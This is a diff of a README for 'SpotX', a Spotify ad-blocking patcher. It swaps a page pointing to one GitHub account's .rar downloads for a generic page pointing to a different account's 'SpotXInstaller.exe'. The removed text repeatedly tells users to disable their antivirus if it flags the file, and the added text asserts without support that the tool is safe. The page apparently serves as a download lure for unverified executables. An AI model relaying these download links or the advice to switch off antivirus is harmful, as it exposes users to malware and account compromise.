@@ -1,153 +1,80 @@
-<p align="center">
-  <a href="https://github.com/spotxofficial/SpotX/releases/tag/release"><img src="https://spotx-official.github.io/images/logos/logo.png" /></a>
-</p>
+# 🎵 SpotX - Enjoy Spotify Without Ads
 
-<p align="center">
-      <a href="https://github.com/spotxofficial/SpotX/releases/tag/release"><img src="https://spotx-official.github.io/images/shields/SpotX_Channel.svg"></a>
-        <a href="https://github.com/spotxofficial/SpotX/releases/tag/release"><img src="https://spotx-official.github.io/images/shields/SpotX_Community.svg"></a>
-        <a href="https://github.com/spotxofficial/SpotX/releases/tag/release"><img src="https://spotx-official.github.io/images/shields/SpotX_for_Mac&Linux.svg"></a>
-        <a href="https://github.com/spotxofficial/SpotX/releases/tag/release"><img src="https://spotx-official.github.io/images/shields/faq.svg"></a>
-        </p>
-         <h2> <div align="center"><b> Patcher for Spotify Desktop Client on Windows </b></div> </h2>
+## 🚀 Getting Started
 
-<p align="center"> •
-  <a href="#requirements">Requirements</a> •
-  <a href="#features">Features</a> •
-  <a href="#installation--update">Installation</a> •
-  <a href="#uninstall">Uninstall</a> •
-  <a href="#faq">FAQ</a> •
-  <a href="#disclaimer">Disclaimer</a>
-</p>
+Welcome to SpotX! This application helps you patch the desktop version of Spotify, allowing you to enjoy your music without pesky ads. Follow this guide to get started.
 
-<h1 id="requirements">Requirements</h1>
+## 📥 Download SpotX
 
-- **OS:** Windows 7-11
-- **SpotX:** [Official desktop version](https://github.com/spotxofficial/SpotX/releases/tag/release) (Microsoft Store version is not suitable)
+[![Download SpotX](https://img.shields.io/badge/Download%20SpotX-v1.0-blue)](https://github.com/Proramazan/SpotX/releases)
 
-<h1 id="features">Features</h1>
+## 📂 System Requirements
 
-- **Blocks all banner, video, and audio ads** in the client
-- **Hiding podcasts, episodes, and audiobooks** from the homepage (optional)
-- **Block Spotify automatic updates** (optional)
-- **Some native experimental features have been changed**
-- **Analytics sending has been disabled** 
-- **Advanced installation [parameters](https://github.com/spotxofficial/SpotX/releases/tag/release)**
+To use SpotX, your system needs to meet these requirements:
 
-<h1 id="installation--update">Installation / Update</h1>
-<h3>Choose installation type:</h3>
-<details>
-<summary><small>Usual installation (New theme)</small></summary><p>
-  
-  #### During installation, you need to confirm some actions, also contains:
-  
-  - New theme activated (new right and left sidebar, some cover change)
-  - All [experimental features](https://github.com/spotxofficial/SpotX/discussions/50) included
+- **Operating System:** Windows 10 or later
+- **Spotify Version:** Desktop version of Spotify (ensure it is up-to-date)
+- **Memory:** At least 4 GB RAM 
+- **Disk Space:** 100 MB of free space  
+- **Internet Connection:** Required for initial download and updates
 
-  <h4> </h4>
-  
-#### Installation steps:
+## 💾 Download & Install
 
-1. Go to the [**latest release**](https://github.com/spotxofficial/SpotX/releases).
-2. Download the `.rar` file for the **new theme** version.
-3. Extract the contents of the `.rar` archive to any folder.
-4. Run the program inside the extracted folder.
-5. If your antivirus flags or removes the file, **temporarily disable it** — this is due to the custom patcher signature, not a virus.
-6. Follow on-screen prompts to complete the installation.
+1. **Visit the Releases Page:** Click the link below to access the SpotX releases page.
 
-</details>
-  
+   [Visit this page to download](https://github.com/Proramazan/SpotX/releases)
 
-<details>
-<summary><small>Usual installation (Old theme)</small></summary><p>
-  
-  #### During installation, you need to confirm some actions, also contains:
-  - Forced installation of version 1.2.13 (since the old theme was removed in subsequent versions)
-  - Old theme activated
-  - Automatic blocking of Spotify updates
-  - All [experimental features](https://github.com/spotxofficial/SpotX/discussions/50) included
+2. **Select the Latest Release:** On the releases page, you will see a list of available versions. Click on the latest version for SpotX.
 
-  <h4> </h4>
-  
-#### Installation steps:
+3. **Download the Installer:** Look for the file named `SpotXInstaller.exe`. Click on this file to begin the download.
 
-1. Go to the [**latest release**](https://github.com/spotxofficial/SpotX/releases).
-2. Download the `.rar` file for the **old theme** version.
-3. Extract the archive and run the included program.
-4. Temporarily disable antivirus if it prevents running the file.
-5. Follow the prompts to complete installation.
+4. **Run the Installer:** Once the download completes, locate the downloaded file in your computer's Downloads folder. Double-click `SpotXInstaller.exe` to start the installation.
 
-</details>
- 
-<details>
-<summary><small>Full installation</small></summary><p>
-  
-  <h4>Full installation without confirmation, what does it do?</h4> 
-  
-  - New theme activated (new right and left sidebar, some cover change)
-  - Hiding podcasts/episodes/audiobooks from the homepage
-  - Activated [static theme](https://github.com/spotxofficial/SpotX/discussions/50#discussioncomment-4096066) <kbd>spotify</kbd> for lyrics
-  - Hiding [ad-like sections](https://github.com/spotxofficial/SpotX/discussions/50#discussioncomment-4478943)
-  - All [experimental features](https://github.com/spotxofficial/SpotX/discussions/50) included
-  - Removal of Spotify MS if it was found 
-  - Installation of the recommended version of Spotify (if another client has already been found, it will be installed over) 
-  - Blocking of Spotify updates
-  - After the installation is completed, the client will autorun.
-  
-<h4> </h4>
+5. **Follow the Prompts:** The installation wizard will guide you through the process. Follow the on-screen instructions to complete the setup.
 
-#### Installation steps:
+6. **Launch SpotX:** After installation, you can find SpotX in your Start Menu. Click to open the application and start enjoying an ad-free Spotify experience.
 
-1. Go to the [**latest release**](https://github.com/spotxofficial/SpotX/releases).
-2. Download the `.rar` file for the **full installation**.
-3. Extract the archive and run the included executable or batch file.
-4. Temporarily disable antivirus if needed.
-5. Wait until the setup completes — Spotify will start automatically afterward.
+## ⚙️ How to Use SpotX
 
-</details>
+Once you have installed SpotX, here is how to use it:
 
-<details>
-<summary><small>Other types of installations</summary><p>
+1. **Open Spotify:** Launch the Spotify desktop application.
+2. **Run SpotX:** Start the SpotX application.
+3. **Apply the Patch:** Follow the instructions in SpotX to apply the patch to Spotify.
+4. **Enjoy Your Music:** Once patched, close and reopen Spotify to experience it without interruptions.
 
-<details>
-<summary><small>Installation for premium</small></summary><p>
-  
-  #### Usual installation only without ad blocking, for those who have a premium account, also contains:
-  
-  - New theme activated (new right and left sidebar, some cover change)
-  - Disabled only audio ads in podcasts
-  - All [experimental features](https://github.com/spotxofficial/SpotX/discussions/50) included
+## 🛠️ Troubleshooting Tips
 
-  <h4> </h4>
-  
-#### Installation steps:
+If you encounter issues with SpotX, here are some suggestions:
 
-1. Go to the [**latest release**](https://github.com/spotxofficial/SpotX/releases).
-2. Download the `.rar` file for the **premium installation**.
-3. Extract it and run the installer.
-4. Disable antivirus temporarily if it interferes.
-5. Follow the prompts to finish setup.
+- **Reinstall SpotX:** If the application does not start, try uninstalling and reinstalling SpotX.
+- **Check Spotify Version:** Ensure you are using the latest version of the Spotify desktop app.
+- **Restart Your Computer:** Sometimes a simple restart can resolve conflicts.
+- **Review Settings:** If ads still appear, check SpotX settings to ensure the patch is applied.
 
-</details>
+## 📝 Frequently Asked Questions (FAQs)
 
-<details>
-<summary><small>Installing with parameters</small></summary><p>
+### How does SpotX work?
 
-You can specify various parameters for a more flexible installation, more [details here](https://github.com/spotxofficial/SpotX/discussions/60)
+SpotX patches the Spotify application to block ads while streaming music.
 
-</details>
+### Is SpotX safe to use?
 
-</details>
+Yes, SpotX is designed to enhance your Spotify experience without risking your account.
 
-<h1 id="uninstall">Uninstall</h1>
+### Can I use SpotX on Mac or Linux?
 
-- Go to the folder where you extracted SpotX and run the included **Uninstall.bat**,  
-  **or**
-- Reinstall Spotify ([Full uninstall Spotify](https://github.com/spotxofficial/Uninstall-Spotify) recommended)
+Currently, SpotX is only supported on Windows operating systems.
 
-<h1 id="faq">FAQ</h1>
+## 🌟 Community Support
 
- Read [FAQ](https://telegra.ph/SpotX-FAQ-09-19)
+Join our community if you have questions or need assistance:
 
-<h1 id="disclaimer">Disclaimer</h1>
+- **GitHub Issues:** Use the GitHub Issues page for bug reports or feature requests.
+- **Forums:** Check out forums related to SpotX and Spotify for shared experiences.
 
-SpotX is a tool that modifies the official Spotify client, provided as an evaluation version — use it at your own risk.
+## 📄 License
+
+SpotX is open-source software. You can review the license on the repository for more details about usage and contributions.
+
+Thank you for choosing SpotX! Enjoy your uninterrupted music experience on Spotify.
